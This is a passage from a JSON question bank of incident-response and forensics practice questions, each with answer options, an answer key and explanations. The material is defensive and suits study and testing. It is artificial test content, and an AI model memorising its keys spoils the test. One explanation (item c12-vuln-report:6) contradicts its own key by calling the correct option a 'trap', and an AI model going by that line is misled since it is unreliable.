SHA-256 hash of <code>e8b3...12d4</code>. What is the BEST course of action?","o":["Proceed with forensic examination because hash differences are expected during compression.","Discard the generated image, inspect the hardware and write blocker, and restart the acquisition.","Document the hash disparity in the chain of custody log and continue analysis.","Apply a software patch to the image file to align the sector boundaries."],"a":1,"e":"A hash mismatch indicates that the image does not identically match the source drive, rendering it legally invalid. The analyst must discard the corrupted image, verify the imaging equipment and write blocker, and re-image the drive.","l":"c10-evidence","l2":"","k":""},{"id":"lq:c10-evidence:3","set":"lq","ch":10,"d":3,"q":"During an incident investigation involving a suspected data breach, an organization receives notice of imminent regulatory litigation. What mechanism should legal counsel implement FIRST to guarantee relevant evidence is not destroyed by automated archiving scripts?","o":["A chain of custody form","A non-disclosure agreement","A legal hold","A business impact analysis"],"a":2,"e":"A legal hold formally mandates the immediate preservation of all relevant physical and electronic records, suspending automated routine data purge and retention schedules.","l":"c10-evidence","l2":"","k":""},{"id":"lq:c10-evidence:4","set":"lq","ch":10,"d":3,"q":"A security analyst is triaging alerts across multiple perimeter security controls. The analyst enriches raw firewall connection records by appending external threat intelligence reputation feeds and GeoIP coordinates. Which operational process does this describe?","o":["Log correlation","Order of volatility prioritization","Legal hold preservation","Log augmentation and enrichment"],"a":3,"e":"Log augmentation and enrichment involves adding supplementary contextual data (such as GeoIP geolocation or threat reputation) to raw log entries to assist analysts during triage.","l":"c10-evidence","l2":"","k":""},{"id":"lq:c10-evidence:5","set":"lq","ch":10,"d":3,"q":"An incident response team is assessing a ransomware outbreak that has encrypted file shares across an accounting department. The team calculates that customer transactions are halted (functional impact), confidential financial records may have been read (information impact), and full restoration from backups will require 36 hours. Which NIST SP 800-61 metric evaluates the 36-hour restoration timeline?","o":["Recoverability effort","Functional impact","Information impact","Data classification level"],"a":0,"e":"Recoverability effort evaluates the time, staffing, technical requirements, and feasibility needed to restore systems and operations to a normal state.","l":"c10-evidence","l2":"","k":""},{"id":"lq:c10-evidence:6","set":"lq","ch":10,"d":3,"q":"An analyst responds to a compromised virtual machine hosted in Amazon Web Services (AWS). Which technique represents the BEST method for acquiring the virtual disk while maintaining chain of custody?","o":["Log into the guest OS via SSH and run Linux <code>dd</code> across an open internet connection.","Create an Amazon EBS snapshot of the root volume and transfer it to an isolated forensic account.","Download the virtual machine memory dump directly to a public S3 bucket.","Shut down the hypervisor host server and physically image the underlying blade drive."],"a":1,"e":"In AWS environments, taking an EBS snapshot and moving it to an isolated, restricted-access forensic account preserves the disk state without contaminating the live environment or exposing data publicly.","l":"c10-evidence","l2":"","k":""},{"id":"lq:c10-evidence:7","set":"lq","ch":10,"d":3,"q":"An investigator seizes an unlocked suspect smartphone at a crime scene. Which action must the investigator take IMMEDIATELY before conducting any data acquisition?","o":["Connect the smartphone to an untrusted internet-connected workstation to browse the filesystem.","Force a hard power down immediately using physical hardware button combinations.","Isolate the device from wireless networks using airplane mode or a Faraday bag.","Attempt to execute a permanent bootloader unlock to facilitate physical memory carving."],"a":2,"e":"Mobile devices must be isolated immediately from all cellular, Wi-Fi, and Bluetooth radio signals using airplane mode and a Faraday bag or RF-shielded container. This prevents remote attackers or accomplices from transmitting remote wipe or factory-reset commands that permanently destroy evidence. Option B is tempting because powering off halts execution, but powering off an unlocked smartphone places it into a \"Before First Unlock\" (BFU) encrypted state, making subsequent forensic extraction far more difficult or impossible without the passcode. Options A and D introduce unauthorized data modifications or risk triggering device wiping mechanisms.","l":"c10-evidence","l2":"","k":""},{"id":"lq:c10-evidence:8","set":"lq","ch":10,"d":3,"q":"Which memory forensics framework supports plugin modules to analyze process trees, inspect network sockets, and detect hidden rootkits across Windows, Linux, and macOS memory images?","o":["FTK Imager","WinDbg","EnCase E01","Volatility Framework"],"a":3,"e":"The Volatility Framework is the industry-standard, cross-platform memory analysis tool designed specifically to extract and inspect processes, network connections, and rootkits from RAM dumps.","l":"c10-evidence","l2":"","k":""},{"id":"lq:c10-analysis:1","set":"lq","ch":10,"d":3,"q":"An analyst is correlating security logs from an authentication server in New York (EDT, UTC-4), a reverse proxy in London (BST, UTC+1), and an application server in Tokyo (JST, UTC+9). What must the analyst do FIRST before assembling the master incident timeline?","o":["Normalize all event timestamps to Coordinated Universal Time (UTC).","Filter out all successful authentication events to isolate malicious requests.","Export all log files into an encrypted WORM storage volume.","Calculate the SHA-256 hash of each individual server log file."],"a":0,"e":"Log sources located across multiple time zones must be normalized to a common reference time (UTC) before cross-source timeline reconstruction; otherwise, events will appear out of chronological sequence.","l":"c10-analysis","l2":"","k":""},{"id":"lq:c10-analysis:2","set":"lq","ch":10,"d":3,"q":"An organization receives a legal hold notification regarding an impending patent infringement lawsuit. Two days later, an automated script runs and purges 90-day-old email server logs according to the standard corporate data retention schedule. Which term describes this failure?","o":["Adverse inference","Spoliation","Chain of custody breach","Order of volatility error"],"a":1,"e":"Spoliation is the negligent or intentional destruction or alteration of evidence relevant to active or anticipated litigation. Legal holds unconditionally override routine automated retention policies.","l":"c10-analysis","l2":"","k":""},{"id":"lq:c10-analysis:3","set":"lq","ch":10,"d":3,"q":"A security engineer must architect a cloud-based forensic repository to preserve digital disk images. The repository must guarantee that stored images cannot be altered, overwritten, or deleted by any user for five years, while logging all access attempts. Which solution BEST meets these requirements?","o":["An Amazon EBS volume attached to an analyst EC2 instance with read-only permissions.","A network-attached storage share configured with discretionary access control lists.","An Amazon S3 bucket configured with Object Lock in compliance mode and versioning enabled.","An unencrypted SFTP server hosted across geographically redundant availability zones."],"a":2,"e":"Amazon S3 Object Lock in compliance mode provides Write Once, Read Many (WORM) storage protection, preventing any user (including the root account) from modifying or deleting objects during the retention period.","l":"c10-analysis","l2":"","k":""},{"id":"lq:c10-analysis:4","set":"lq","ch":10,"d":3,"q":"A forensic investigator needs to verify the cryptographic integrity of a captured forensic image named <code>drive_evidence.e01</code> on a Windows workstation. Which command provides the SHA-256 hash for chain of custody documentation?","o":["<code>sha256sum -validate drive_evidence.e01</code>","<code>Get-FileHash -Algorithm MD5 drive_evidence.e01</code>","<code>hashdump -v drive_evidence.e01 -t sha256</code>","<code>certutil -hashfile drive_evidence.e01 SHA256</code>"],"a":3,"e":"The built-in Windows utility <code>certutil -hashfile &lt;filename&gt; SHA256</code> calculates the SHA-256 cryptographic hash of a file for forensic verification.","l":"c10-analysis","l2":"","k":""},{"id":"lq:c10-analysis:5","set":"lq","ch":10,"d":3,"q":"During evidence collection of a suspect workstation, two technicians are present: one technician creates the disk image via a write blocker, while the other verifies the hashes and co-signs the custody record. Which forensic principle does this illustrate?","o":["The two-person rule","Order of volatility","Adverse inference validation","Discretionary access control"],"a":0,"e":"The two-person rule ensures that critical forensic tasks are independently witnessed and verified, preventing claims of evidence tampering, mishandling, or fabrication.","l":"c10-analysis","l2":"","k":""},{"id":"lq:c10-analysis:6","set":"lq","ch":10,"d":3,"q":"A junior analyst receives an alert indicating a single anomalous outbound connection to an unknown IP address. The analyst immediately pages the Chief Information Officer and corporate legal counsel. Why is this action considered an operational error?","o":["The analyst should have acquired physical drive images before contacting any internal personnel.","The analyst escalated prematurely without conducting triage to assess confidence, scope, and blast radius.","The analyst failed to submit a legal hold notice to the Chief Information Officer.","The analyst violated the order of volatility by notifying leadership before collecting RAM."],"a":1,"e":"Escalation requires prior triage: verifying whether the alert is a true positive, identifying affected systems, assessing potential blast radius, and assigning a structured severity rating.","l":"c10-analysis","l2":"","k":""},{"id":"lq:c10-analysis:7","set":"lq","ch":10,"d":3,"q":"While inspecting a suspect disk image, a forensic examiner discovers valuable text fragments from an old, deleted email located in the unused bytes between the end of an active file and the end of the 4KB cluster. What storage area is the examiner analyzing?","o":["Unallocated space","CPU cache","Slack space","Swap partition"],"a":2,"e":"Slack space (specifically file slack) is the unused storage gap within an allocated cluster between the end of the logical file data and the end of the physical disk sector/cluster.","l":"c10-analysis","l2":"","k":""},{"id":"lq:c10-analysis:8","set":"lq","ch":10,"d":3,"q":"An incident responder detects unauthorized administrative changes within an enterprise Amazon Web Services (AWS) deployment. Which service should the responder query to reconstruct the complete chronological history of API calls made by the compromised IAM role?","o":["Amazon CloudWatch Logs","AWS GuardDuty","Amazon Inspector","AWS CloudTrail"],"a":3,"e":"AWS CloudTrail records and tracks all API calls and management events within an AWS account, including the identity of the caller, time of call, source IP, and requested parameters.","l":"c10-analysis","l2":"","k":""},{"id":"lq:c11-contain:1","set":"lq","ch":11,"d":3,"q":"An analyst discovers active malware beaconing on an executive workstation that processes confidential merger data. Forensic memory acquisition is required. Which containment action is the BEST initial response?","o":["Execute EDR host isolation to sever network traffic while keeping the management agent online.","Unplug the power cable from the workstation to immediately halt data transmission.","Perform a hard reboot and boot the workstation into an offline Linux live forensic distribution.","Revoke the user's Kerberos tickets and disable the domain account in Active Directory without isolating the endpoint."],"a":0,"e":"EDR host network isolation severs all inbound and outbound user traffic to halt external data exfiltration and prevent lateral movement, while keeping the kernel management agent connected so responders can acquire volatile memory and conduct remote triage. Option D is tempting because identity containment is important, but disabling the user account leaves the active malware process executing on the workstation and beaconing out. Options B and C flush volatile RAM, permanently destroying memory-resident malware payloads, injection artifacts, and cryptographic keys.","l":"c11-contain","l2":"","k":""},{"id":"lq:c11-contain:2","set":"lq","ch":11,"d":3,"q":"A security analyst monitoring a SIEM identifies that an attacker has gained access to a core revenue-generating production database. The analyst has root credentials and can immediately execute an emergency network interface shutdown on the database server. What should the analyst do FIRST?","o":["Power off the database immediately to protect customer data confidentiality at all costs.","Escalate the incident to incident command and operational leadership to obtain shutdown authorization.","Deploy an unverified local firewall drop rule on the database server without consulting the database administrator.","Attempt to trace the attacker IP address through public Tor exit nodes to establish real-world attribution."],"a":1,"e":"Technical ability does not equal operational authority. Shutting down a core production database causes immediate, severe business disruption and revenue loss, which requires management escalation, business impact evaluation, and incident command authorization. Option A is tempting because security instincts prioritize confidentiality, but unilateral shutdown of critical infrastructure without operational approval can cause catastrophic business disruption. Option C risks breaking legitimate database transaction connections, and Option D is a futile distraction during active containment.","l":"c11-contain","l2":"","k":""},{"id":"lq:c11-contain:3","set":"lq","ch":11,"d":3,"q":"A healthcare provider discovers that an unsecured cloud bucket containing 50,000 patient records was accessed by an unauthorized external IP address. The compliance team insists on completing a three-month forensic root-cause analysis before alerting authorities. Why is this strategy flawed?","o":["Cloud storage buckets cannot be forensically audited once unauthorized read actions occur.","Healthcare organizations are legally exempt from breach disclosures if data was hosted by a third-party cloud provider.","Regulatory notification deadlines (such as GDPR 72 hours and HIPAA rules) start at awareness, not after final investigation.","The compliance team is legally mandated to purge the compromised storage bucket immediately upon breach discovery."],"a":2,"e":"Regulatory breach disclosure timers (such as GDPR Article 33 requiring notice within 72 hours, and HIPAA Breach Notification Rule requirements) begin as soon as the organization has a reasonable degree of certainty that a security incident impacting protected data has occurred. Waiting months to complete a comprehensive forensic post-mortem before notifying authorities results in severe statutory penalties. Option B is false because data controllers retain legal liability regardless of third-party cloud hosting. Options A and D are technically and forensically false.","l":"c11-contain","l2":"","k":""},{"id":"lq:c11-contain:4","set":"lq","ch":11,"d":3,"q":"An incident responder is deciding how to isolate a compromised virtual machine in Amazon Web Services (AWS) without deleting forensic records. Which action BEST satisfies this objective?","o":["Terminate the EC2 instance immediately and release all associated Elastic IP addresses.","Reboot the instance into single-user rescue mode across the public internet.","Deregister the instance from the VPC route table and delete the attached internet gateway.","Apply an isolated Security Group with deny-all rules and apply an inline deny-all policy to the attached IAM role."],"a":3,"e":"Applying an isolated Security Group with zero inbound and outbound rules cuts all network connectivity to the EC2 instance at the hypervisor level. Concurrently attaching an inline deny-all policy to the instance's IAM role prevents the compromised instance from making cloud API calls to other AWS resources, while leaving the instance running so responders can capture volatile memory, take EBS snapshots, and preserve CloudTrail audit logs. Option A is the classic catastrophic mistake: terminating the instance destroys volatile memory and deletes non-persistent EBS volumes. Options B and C expose rescue sessions over the internet or break connectivity for the entire VPC.","l":"c11-contain","l2":"","k":""},{"id":"lq:c11-contain:5","set":"lq","ch":11,"d":3,"q":"During a malware outbreak, an analyst isolates an infected server by pulling the physical network cable. Seconds later, the server begins violently encrypting local hard drives and deleting system event logs. What mechanism did the attacker MOST likely deploy?","o":["A dead-man switch detecting the loss of external network connectivity","A logic bomb triggered by an NTP server update","A software write blocker failing to drop write commands","An automated EDR agent rollback failure"],"a":0,"e":"A dead-man switch is an anti-forensic mechanism where malware monitors external connectivity (such as pinging 8.8.8.8) and triggers destructive wiping or encryption if network access is abruptly cut.","l":"c11-contain","l2":"","k":""},{"id":"lq:c11-contain:6","set":"lq","ch":11,"d":3,"q":"Which of the following factors should be the PRIMARY driver when prioritizing incident response resources across multiple concurrent alerts?","o":["The total quantity of compromised endpoints regardless of data sensitivity","The sensitivity of the affected data and potential regulatory liability","The geographical location of the attacker's command-and-control server","The physical cost of the hardware endpoints involved in the incident"],"a":1,"e":"Incident prioritization is driven by data classification, regulatory liability, and business impact. A single compromised database holding sensitive PII takes priority over dozens of non-critical workstations.","l":"c11-contain","l2":"","k":""},{"id":"lq:c11-contain:7","set":"lq","ch":11,"d":3,"q":"An incident response team is preparing to release an enterprise file server from isolation back into the production environment. Which sequence represents the required release criteria?","o":["Restore from unverified backup, enable guest access, and disconnect EDR monitoring.","Restart the server three times, verify network ping, and disable firewall logging.","Verify threat eradication, remediate the root-cause vulnerability, reset credentials, obtain lead sign-off, and apply enhanced monitoring.","Wait 48 hours for attacker dormancy, change the hostname, and archive all system logs."],"a":2,"e":"Safe release from isolation requires confirming threat eradication, fixing the root vulnerability, resetting credentials, obtaining formal sign-off, and maintaining enhanced post-release monitoring.","l":"c11-contain","l2":"","k":""},{"id":"lq:c11-contain:8","set":"lq","ch":11,"d":3,"q":"A security analyst notices that a compromised employee user account is actively logging into Microsoft 365 services from an overseas IP address. What is the FASTEST way to terminate the attacker's active cloud sessions?","o":["Submit a firewall change ticket to block the entire overseas country IP block.","Send an email to the employee instructing them to close their browser.","Reimage the employee's office laptop via network PXE boot.","Revoke the user's active sessions and OAuth refresh tokens in Microsoft Entra ID."],"a":3,"e":"Revoking active sessions and refresh tokens in Microsoft Entra ID immediately invalidates existing authorization tokens, severing active attacker browser sessions across all Microsoft 365 cloud applications.","l":"c11-contain","l2":"","k":""},{"id":"lq:c11-contain:9","set":"lq","ch":11,"d":3,"q":"An enterprise web server experiences a high-volume volumetric Distributed Denial of Service (DDoS) attack that exhausts bandwidth. Which containment action is MOST appropriate?","o":["Implement upstream ISP rate limiting and deploy cloud DDoS mitigation filtering.","Physically disconnect the perimeter network cables from the web servers.","Disable all administrative user accounts and rotate root passwords on the web server.","Re-image all internal web servers from golden master backup templates."],"a":0,"e":"Volumetric DDoS attacks flood upstream network pipes with millions of packets, exhausting physical bandwidth before traffic even reaches the enterprise perimeter. Effective containment requires engaging the upstream Internet Service Provider (ISP) to drop malicious traffic at upstream transit routers and diverting DNS to cloud-based scrubbing centers (e.g., Cloudflare, AWS Shield) to filter attack traffic. Option B is the primary blunder: disconnecting the server achieves the attacker's goal by keeping the service offline. Options C and D address host compromise and credential theft, which do not mitigate an external bandwidth exhaustion flood.","l":"c11-contain","l2":"","k":""},{"id":"lq:c11-contain:10","set":"lq","ch":11,"d":3,"q":"Why does NIST SP 800-61r2 recommend against spending extensive time and resources attempting to identify and attribute the external individual behind a cyberattack?","o":["Attacker attribution is required by federal statute before containment actions can legally begin.","Private organizations lack legal authority, and attribution is time-consuming and distracts from damage minimization.","Attacker attribution is strictly prohibited under international cybersecurity treaties without United Nations approval.","Attribution automatically transfers all civil and regulatory breach liabilities to the cloud hosting provider."],"a":1,"e":"NIST SP 800-61r2 emphasizes that legal attribution (identifying the real-world human perpetrator) is an arduous, resource-intensive task best handled by law enforcement and national intelligence agencies. Threat actors routinely route traffic through Tor, multi-jurisdictional proxy networks, and compromised third-party servers. Spending valuable CSIRT hours pursuing attribution distracts the team from their core responsibilities: containing the intrusion, eradicating the threat, and restoring business services. Option A is false because containment must never wait on attribution. Options C and D are legally baseless.","l":"c11-contain","l2":"","k":""},{"id":"lq:c11-recover:1","set":"lq","ch":11,"d":3,"q":"An incident team responds to an advanced persistent threat (APT) that compromised an internal file server 45 days ago. Which eradication and recovery strategy is the MOST effective to ensure the threat is completely removed?","o":["Rebuild the server from scratch or a known-good gold master, patch the root vulnerability, and scan pre-incident backups.","Run an automated antivirus scan in safe mode and reboot the server.","Reset the local administrator password and clear all temporary system files.","Deploy a network sniffer on the switch port and monitor outbound traffic for 24 hours."],"a":0,"e":"Due to the 45-day dwell time, the server cannot be trusted, and backups may contain dormant attacker footholds. The most effective approach is rebuilding from a trusted known-good image, patching the vulnerability, and scanning backups.","l":"c11-recover","l2":"","k":""},{"id":"lq:c11-recover:2","set":"lq","ch":11,"d":3,"q":"An incident responder is planning eradication steps for a compromised host containing multiple unauthorized scheduled tasks and registry run keys. Which sequence of actions should the responder follow?","o":["Rotate domain credentials, restart the computer, and then inspect the registry.","Identify and remove all persistence mechanisms, patch the enabling vulnerability, and then rotate credentials.","Patch the vulnerability, rotate user credentials, and then search for persistence mechanisms.","Restore the server to production, enable logging, and begin persistence analysis."],"a":1,"e":"Responders must identify and eliminate all persistence mechanisms first, patch the vulnerability, and then rotate credentials. Rotating credentials before eliminating persistence allows the adversary to capture the new credentials via existing footholds.","l":"c11-recover","l2":"","k":""},{"id":"lq:c11-recover:3","set":"lq","ch":11,"d":3,"q":"An organization is decommissioning magnetic hard drives that previously stored classified customer financial records. Company policy mandates that data recovery must be infeasible even using advanced laboratory tools, but the drives should be retained for future internal server use. Which NIST SP 800-88r2 sanitization method is required?","o":["Clear","Destroy","Purge","Reformat"],"a":2,"e":"Purge techniques (such as cryptographic erase or multi-pass overwrite) render data recovery infeasible even using laboratory techniques while potentially preserving the physical media for reuse.","l":"c11-recover","l2":"","k":""},{"id":"lq:c11-recover:4","set":"lq","ch":11,"d":3,"q":"An enterprise web application server has been reconstituted and hardened following an SQL injection attack. Which action is essential to complete during the verification phase BEFORE releasing the server back into normal production?","o":["Implement an unmonitored alert suppression rule for the server to prevent alarms during initial load testing","Submit an insurance reimbursement claim detailing the total downtime cost of the database server","Execute an offline cryptographic wipe of the secondary storage volumes attached to the server","Verify that security event logging is active, functional, and transmitting telemetry to the central SIEM repository"],"a":3,"e":"During emergency rebuilds and triage, logging agents or audit policies are frequently modified, disabled, or misconfigured. Responders must explicitly verify that operating system and application security auditing is fully operational and reliably forwarding telemetry to the SIEM before returning systems to production. Suppressing alerts creates blind spots, and insurance claims occur during post-incident closeout.","l":"c11-recover","l2":"","k":""},{"id":"lq:c11-recover:5","set":"lq","ch":11,"d":3,"q":"A security analyst is monitoring Microsoft Entra ID sign-in telemetry. An alert indicates that a corporate user account successfully authenticated from London, UK, and 18 minutes later successfully authenticated from Sydney, Australia. Which anomaly indicator does this reflect?","o":["Impossible travel","Beaconing jitter","Living-off-the-land execution","Dead-man switch trigger"],"a":0,"e":"Impossible travel occurs when an account authenticates from two distinct geographic locations within a timeframe that is physically impossible to travel between, indicating credential theft or proxy abuse.","l":"c11-recover","l2":"","k":""},{"id":"lq:c11-recover:6","set":"lq","ch":11,"d":3,"q":"Following the recovery of a compromised domain controller, how long should the security operations center maintain an enhanced monitoring period before returning the system to standard baseline monitoring?","o":["1 to 2 hours","7 to 30 days","24 hours maximum","6 months to 1 year"],"a":1,"e":"Recovered systems should remain subject to enhanced monitoring for 7 to 30 days post-incident to ensure the adversary has not retained covert secondary footholds.","l":"c11-recover","l2":"","k":""},{"id":"lq:c11-recover:7","set":"lq","ch":11,"d":3,"q":"Which Windows Security Event ID should an analyst monitor to track successful authentications during an active incident investigation?","o":["Event ID 1102","Event ID 4672","Event ID 4624","Event ID 7045"],"a":2,"e":"Windows Security Event ID 4624 logs all successful account logons, making it a critical telemetry indicator when monitoring for attacker recurrence and lateral movement.","l":"c11-recover","l2":"","k":""},{"id":"lq:c11-recover:8","set":"lq","ch":11,"d":3,"q":"During post-incident activities, what is the primary purpose of conducting a formal blameless lessons-learned meeting?","o":["To assign individual disciplinary penalties to personnel whose errors contributed to the compromise","To calculate final insurance claims and determine employee severance packages","To fulfill public relations marketing requirements for corporate customer retention","To identify operational response gaps, update incident playbooks, and develop actionable Corrective Action Plans"],"a":3,"e":"A blameless lessons-learned session focuses on evaluating operational performance, uncovering systemic process deficiencies, and generating Corrective Action Plans (CAPs) to improve defenses. Assigning individual blame discourages honest reporting, while financial settlements and marketing communications belong to executive and legal teams.","l":"c11-recover","l2":"","k":""},{"id":"lq:c11-recover:9","set":"lq","ch":11,"d":3,"q":"An analyst investigating an active incident creates temporary SIEM alert suppression rules to reduce notification noise caused by automated remediation scripts. What operational guardrail MUST the analyst implement?","o":["Ensure the suppression rule is tightly scoped to specific entities and configured to automatically expire within 24 to 48 hours","Apply the suppression filter globally across all enterprise subnets to prevent notification storms","Disable SIEM event ingestion temporarily until system remediation scripts complete execution","Route all suppressed events to an unmonitored archive volume without generating audit logs"],"a":0,"e":"Alert suppression rules must be narrowly scoped (targeting only specific hosts, scripts, or alert IDs) and enforce strict, automated expiration windows (typically 24 to 48 hours). Forgetting to remove suppression rules creates permanent blind spots that adversaries can exploit. Applying blanket subnet rules or disabling SIEM ingestion leaves the entire enterprise unprotected.","l":"c11-recover","l2":"","k":""},{"id":"lq:c12-vuln-report:1","set":"lq","ch":12,"d":4,"q":"A security analyst is reviewing a vulnerability scan report that reveals a CVSS 9.8 critical remote code execution vulnerability on a legacy industrial control server. The manufacturer ceased software support five years ago, and no patch exists. Which remediation strategy is MOST appropriate?","o":["Isolate the system on a segmented VLAN, apply strict firewall ACLs, and submit a formal risk acceptance request.","Close the vulnerability ticket without action because unpatchable legacy controllers are exempt from enterprise audits.","Compile and install third-party open-source kernel patches directly on the production controller without vendor testing.","Execute automated credentialed vulnerability scans every two hours until the scanner clears the finding."],"a":0,"e":"When critical legacy systems cannot be patched due to vendor obsolescence, security teams must deploy compensating controls: isolating the device on a dedicated, micro-segmented VLAN, enforcing strict firewall access control lists, implementing deep inspection, and obtaining documented executive risk acceptance with defined review timelines. Option B is the compliance trap: legacy systems are prime targets and cannot be arbitrarily exempted without controls. Option C risks corrupting proprietary control firmware and causing physical damage. Option D destabilizes fragile industrial equipment without fixing the flaw.","l":"c12-vuln-report","l2":"","k":""},{"id":"lq:c12-vuln-report:2","set":"lq","ch":12,"d":4,"q":"An organization establishes a policy requiring all Critical vulnerabilities to be resolved within 15 days. To ensure teams meet this deadline, the security director instructs analysts to flag any Critical finding that remains unpatched after 10 days. Which term BEST describes this 10-day target?","o":["Service-Level Agreement (SLA)","Service-Level Objective (SLO)","Memorandum of Understanding (MOU)","Mean Time to Detect (MTTD)"],"a":1,"e":"A Service-Level Objective (SLO) is an internal operational target set below the formal SLA (10 days vs 15 days) to provide a safety buffer and prevent formal SLA breaches.","l":"c12-vuln-report","l2":"","k":""},{"id":"lq:c12-vuln-report:3","set":"lq","ch":12,"d":4,"q":"A monthly vulnerability report indicates that the total count of open High-severity vulnerabilities increased by 40% over the previous quarter. However, the Chief Information Security Officer notes that the overall security posture has actually improved. What context BEST explains this metric?","o":["The vulnerability scanner failed to perform authenticated scans during the current assessment cycle.","All critical vulnerabilities were downgraded to low severity by the Change Advisory Board.","The security team broadened scan coverage to include previously unmonitored cloud environments and branch offices.","The vulnerability scanner increased its port scan throttling to suppress potential false positive alerts."],"a":2,"e":"Vulnerability count metrics must always be interpreted in operational context. Expanding asset discovery and scanning previously unmonitored cloud environments or regional branch offices surfaces previously hidden vulnerabilities. While this causes raw open vulnerability counts to spike, overall organizational security posture improves because visibility blind spots have been eliminated. Option A is tempting because unauthenticated scans produce inaccurate results, but missing credentials typically causes false negatives, which artificially reduces open vulnerability counts. Option B represents improper risk manipulation, and Option D alters scan timing without increasing finding counts.","l":"c12-vuln-report","l2":"","k":""},{"id":"lq:c12-vuln-report:4","set":"lq","ch":12,"d":4,"q":"A security engineer must present quarterly vulnerability findings to the corporate Board of Directors. Which communication format is the MOST appropriate for this audience?","o":["A raw 300-page CSV export listing all CVE identifiers, CVSS vector strings, and technical scanner plugin outputs.","A live terminal demonstration executing automated exploit payloads against internal staging infrastructure.","A technical remediation manual detailing specific command-line syntax and package update commands for systems administrators.","An executive risk scorecard highlighting 30/60/90-day risk trends, business impact, and SLA compliance."],"a":3,"e":"Executive boards require high-level, strategic risk summaries. An effective board presentation uses risk scorecards, business impact framing, historical exposure trends (30/60/90 days), and SLA compliance percentages rather than low-level technical minutiae. Options A and C provide overwhelming technical details (raw CVEs, vector strings, shell syntax) suited for operational analysts and system engineers, not corporate directors. Option B is an adversarial demonstration that fails to provide strategic risk metrics.","l":"c12-vuln-report","l2":"","k":""},{"id":"lq:c12-vuln-report:5","set":"lq","ch":12,"d":4,"q":"A security team identifies an actively weaponized vulnerability affecting the enterprise reverse proxy. The remediation patch is ready, but corporate policy mandates that all changes must be submitted to the Change Advisory Board (CAB) two weeks in advance. Which inhibitor to remediation does this scenario illustrate?","o":["Organizational governance","Degrading functionality","Proprietary systems","Patch availability"],"a":0,"e":"Organizational governance (such as CAB approval cycles and formal change management procedures) can create operational delays when deploying security patches.","l":"c12-vuln-report","l2":"","k":""},{"id":"lq:c12-vuln-report:6","set":"lq","ch":12,"d":4,"q":"An analyst is evaluating whether to escalate an unpatched vulnerability affecting an internal human resources application. The vulnerability has a moderate CVSS score of 5.3, but the analyst discovers it was just added to the CISA Known Exploited Vulnerabilities (KEV) catalog. What action should the analyst take?","o":["Defer action until the next quarterly scanning cycle to confirm whether the CVSS score is adjusted by the NVD.","Escalate the finding immediately because active exploitation in the wild elevates the real-world risk.","Downgrade the finding to informational because the CVSS base score is below the high-severity threshold of 7.0.","Suppress the vulnerability alert in the ticketing system until an automated exploit kit is detected on the local network."],"a":1,"e":"Inclusion in the CISA KEV catalog confirms that a vulnerability is actively weaponized and under exploitation in the wild by real-world threat actors. Active exploitation dramatically elevates risk regardless of a moderate base CVSS score (5.3), necessitating immediate escalation and expedited patching. Option B is the common CVSS-only trap: relying strictly on static base scores while ignoring threat intelligence leads organizations to neglect actively exploited flaws. Options C and D dangerously ignore confirmed real-world attacks.","l":"c12-vuln-report","l2":"","k":""},{"id":"lq:c12-vuln-report:7","set":"lq","ch":12,"d":4,"q":"An external financial compliance auditor requests proof of vulnerability management compliance for an upcoming PCI DSS audit. Which of the following will BEST satisfy the auditor's requirement?","o":["A high-level summary slide from the CISO's annual board presentation showing generalized risk reduction trends.","A signed verbal attestation from the IT operations manager stating that all critical patches were installed on time.","Documented technical scan reports with timestamps, asset scopes, remediation logs, and approved exception records.","An unverified spreadsheet list of scheduled maintenance windows and proposed system outage requests."],"a":2,"e":"Formal compliance audits (such as PCI DSS Requirements 6 and 11) require verifiable, objective evidence packages: timestamped vulnerability scan reports from approved scanners (or ASVs), verified asset scope inventories, documented remediation tracking tickets showing closure within required SLA windows, and formal executive-signed risk exceptions with compensating controls. Options A, B, and D provide informal, unverifiable, or high-level summaries that fail audit evidentiary standards.","l":"c12-vuln-report","l2":"","k":""},{"id":"lq:c12-vuln-report:8","set":"lq","ch":12,"d":4,"q":"A healthcare provider is preparing to patch a critical vulnerability on a specialized MRI control console. The manufacturer warns that installing any unapproved software patches will immediately void the device warranty and terminate vendor support. Which inhibitor to remediation is present?","o":["Degrading functionality","Business process interruption","Memorandum of understanding","Proprietary systems"],"a":3,"e":"Proprietary systems (such as medical devices or specialized industrial controllers) are controlled by third-party vendors whose support contracts or regulatory certifications forbid customer patching.","l":"c12-vuln-report","l2":"","k":""},{"id":"lq:c12-ir-report:1","set":"lq","ch":12,"d":4,"q":"During an active intrusion investigation, a security analyst suspects that an advanced persistent threat (APT) actor has compromised enterprise Microsoft 365 domain administrator credentials. Which communication strategy MUST the response team execute?","o":["Transition all incident coordination to an established out-of-band communication channel.","Send encrypted emails using corporate Microsoft Exchange accounts.","Schedule an emergency Microsoft Teams video conference using single sign-on credentials.","Broadcast incident status updates across the internal IT Slack channel."],"a":0,"e":"When enterprise credentials and cloud infrastructure are suspected of compromise, using corporate channels (Exchange, Teams, Slack) is an OPSEC failure because the attacker can intercept communications. The team must switch to out-of-band channels (such as Signal or isolated cellular networks).","l":"c12-ir-report","l2":"","k":""},{"id":"lq:c12-ir-report:2","set":"lq","ch":12,"d":4,"q":"At the end of a 12-hour night shift, an analyst verbally mentions to the incoming morning lead that an investigation into suspicious PowerShell activity on a domain controller is ongoing, but writes no notes in the ticketing platform. What is the PRIMARY operational risk of this action?","o":["The organization will automatically violate statutory data breach notification disclosure deadlines","Crucial investigative context and lead telemetry will be lost, degrading response and remediation SLO metrics","The local endpoint EDR agent will automatically release network isolation policies upon user logout","The integrity of digital evidence will be legally compromised due to lack of a two-person rule"],"a":1,"e":"Verbal-only shift handovers fail to capture detailed indicators, command-line arguments, or investigative hypotheses, forcing incoming analysts to duplicate work or overlook critical clues. This directly degrades Mean Time to Respond (MTTR) and Mean Time to Remediate SLOs. EDR agents do not release network isolation on logout, and shift notes do not impact statutory notification windows unless the incident is mishandled.","l":"c12-ir-report","l2":"","k":""},{"id":"lq:c12-ir-report:3","set":"lq","ch":12,"d":4,"q":"A security analyst is preparing a post-incident executive summary for the Board of Directors following a customer database exfiltration incident. Which of the following content sets is MOST appropriate for this document?","o":["Raw packet captures, Snort signature definitions, and compiled disassembly listings of malware payloads","A chronological list of all CVE numbers, CVSS base metric vectors, and Linux terminal command histories","Estimated business and financial impact, customer exposure counts, and strategic remediation recommendations","Individual employee performance evaluations and internal disciplinary reprimands for involved staff"],"a":2,"e":"Executive summaries must communicate in business-oriented language focusing on business operations, customer impact, financial liabilities, regulatory exposure, and strategic remediation priorities. Technical hex dumps, raw packet captures, or CVSS vectors are appropriate for technical appendices, and employee disciplinary matters belong to 